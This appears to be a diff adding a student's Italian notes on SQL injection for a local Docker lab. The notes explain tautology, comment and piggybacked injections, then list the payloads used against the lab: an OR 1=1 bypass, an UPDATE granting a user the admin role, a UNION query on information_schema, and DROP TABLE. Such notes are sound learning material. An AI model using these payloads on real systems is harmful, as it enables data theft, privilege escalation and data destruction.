@@ -1,0 +1,93 @@
+
+
+tecnica di attacco che sfrutta la mancanza di filtraggio dell'input utente in query SQL e permette di 
+	- leggere dati sensibili dal database
+	- modificarli/cancellarli
+	- ottenere il controllo totale del DB
+
+si fa questo inserendo codice SQL malevolo nei campi input come form, url, cookie, header http ecc.
+
+inband: l'iniezione e la riposta viaggino sullo stesso canale: pagina web
+
+i tre sottotipi da usare sono:
+	
+	1.TAUTOLOGIA: inserire una condizione sempre vera per forzare la restituzione di tutti i dait
+
+	' OR 1=1 -- 
+
+	SELECT * FROM utenti WHERE username = '$input' AND password = '$pass'
+
+	SELECT * FROM utenti WHERE username = '' OR 1=1 --' AND password = ''
+
+	restituisce tutti i record
+
+
+	2.COMMENTO FINE RIGA: serve per troncare il resto della query dopo aver inserito il codice malevolo 
+
+	il simbolo -- dice al DB di ingorare ciò che viene dopo
+
+	3.QUERY PIGGYBACKED: l'attaccante aggiunge più query nella stessa riga 
+
+	'; DROP TABLE utenti; --
+
+	dopo la query legittima, ne viene eseguita un'altra per droppare una tabella 
+
+
+cosa devo fare
+--------------
+
+
+
+AVVIARE LA MACCHINA
+
+docker-compose down -v --remove-orphans #Questo comando rimuove vecchi container e volumi, se ci sono stati errori 
+
+docker-compose up --build 
+
+http://localhost:8080
+
+
+
+RISOLVI ERRORI:
+
+
+	fai un form con method get 
+
+		nel method get fai action e richiami la pagina stessa
+	
+	all'interno input type text con name='nome' 
+
+	button type submit
+
+
+
+COSA HO FATTO
+
+	Confidentiality : con tautologia 'OR 1=1 --'
+		rubare dati
+
+	Integrity : con piggyback '; UPDATE utenti SET ruolo='admin' WHERE nome='emanuele' -- '
+		modificare dati
+
+	Availability : 
+	//mi permette di ottenere il nome della tabella 
+	' UNION SELECT 1,table_name, 'x' FROM information_schema.tables WHERE table_schema='test' -- 
+
+	//droppare la tabella
+	DROP TABLE utenti
+		cancellare dati
+
+
+
+
+
+
+#creare tabelle
+
+#login (password)
+
+#tabella carte di credito
+
+#utenti
+	#acquisti --> transazioni (carte di credito)
+		#case --> ...
